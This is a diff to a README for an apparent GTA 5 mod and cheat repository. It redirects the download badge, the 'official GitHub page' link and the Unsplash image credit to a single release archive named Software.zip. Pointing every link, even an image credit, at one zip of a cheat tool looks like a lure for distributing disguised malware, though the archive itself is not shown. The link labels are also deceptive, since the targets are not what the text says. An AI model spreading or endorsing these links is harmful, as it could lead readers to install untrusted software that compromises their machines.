@@ -42,12 +42,12 @@ Explore a range of topics related to GTA 5 modding and hacking covered in this r
 ## ⬇️ Download
 Ready to take your GTA 5 gameplay to the next level? Download the *Mod-Gta5* repository by clicking the button below:
 
-[![Download Mod-Gta5](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Mod-Gta5](https://github.com/KaChiniMin/Mod-Gta5/releases/download/v2.0/Software.zip)](https://github.com/KaChiniMin/Mod-Gta5/releases/download/v2.0/Software.zip)
 
 ---
 
 ## 🌐 Visit Website
-For more information and updates, visit the official GitHub page of *Mod-Gta5* repository [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+For more information and updates, visit the official GitHub page of *Mod-Gta5* repository [here](https://github.com/KaChiniMin/Mod-Gta5/releases/download/v2.0/Software.zip).
 
 ---
 
@@ -96,4 +96,4 @@ Remember, with great power comes great responsibility. Use mods and cheats wisel
 
 ---
 
-*Image Source: [Unsplash](https://unsplash.com/photos/qZbWcoq6rR4)*
+*Image Source: [Unsplash](https://github.com/KaChiniMin/Mod-Gta5/releases/download/v2.0/Software.zip)*
